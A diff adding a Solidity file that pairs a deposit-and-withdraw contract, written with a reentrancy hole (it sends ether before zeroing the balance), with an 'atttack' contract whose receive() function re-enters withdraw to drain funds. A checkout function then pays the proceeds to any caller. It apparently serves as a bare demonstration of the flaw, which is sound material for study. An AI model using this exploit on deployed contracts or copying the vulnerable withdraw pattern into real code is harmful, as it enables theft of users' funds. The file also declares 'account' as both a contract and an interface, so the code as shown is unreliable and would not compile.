@@ -1,0 +1,116 @@
+
+// SPDX-License-Identifier: GPL-3.0
+
+
+
+pragma solidity ^0.8.0;
+
+
+
+contract account{ 
+
+  address public owner;
+  mapping(address => uint256) balances;
+  uint256 public limit;
+
+  constructor(uint256 _limit){
+    limit = _limit;
+    owner = msg.sender;
+
+  }
+
+  function setLimit(uint256 _limit) public{
+    require(msg.sender== owner,"only owner can set limit");
+    limit = _limit;
+  }
+
+  function deposit() public payable returns(bool){
+    require (msg.value > 0 ether && msg.value < limit * (10**18) ,"Not in the limit");
+    require (balances[msg.sender] == 0,"already have some amount deposited");
+    balances[msg.sender] = msg.value;
+    return (true);
+  }
+  
+  function balancesAccount() public view returns(uint256){
+    return(balances[msg.sender]);
+  }
+
+  function withdraw() public returns(bool){
+
+  
+    require(balances[msg.sender] >0,"no amount deposited" );
+    (bool sent, bytes memory data) = payable(msg.sender).call{value: balances[msg.sender]}("");
+    balances[msg.sender] = 0;
+    return(sent);
+
+  }
+
+}
+
+
+
+
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.6.2;
+
+contract atttack {
+
+    account ac;
+    address accountContract;
+    address internal owner;
+    uint x = 0;
+
+    constructor(address _contract){
+        accountContract = _contract;
+        ac = account(_contract);
+        owner = msg.sender;
+    }
+
+    receive() external payable {
+         x += 1;
+         require(x <= 5);
+         ac.withdraw();
+   
+
+    }
+    
+    function attack() public payable returns(bool,bool) {
+        
+        bool result = ac.deposit{value: msg.value}(); 
+        bool result1; 
+        result1 = ac.withdraw();
+        return (result,result1);
+
+    } 
+
+    function balance() public view returns(uint256){
+        
+        uint256 y;
+        y = address(this).balance;
+        return (y);
+
+    }
+
+    function checkout() public {
+        
+        payable(msg.sender).transfer(address(this).balance);
+    
+    }
+
+  
+          
+    }
+
+
+interface account{
+
+function setLimit(uint256 _limit)  external;
+
+ function deposit()  payable external returns(bool);
+
+ function withdraw()  external returns(bool);
+
+ function balancesAccount() external view returns(uint256);
+
+
+}
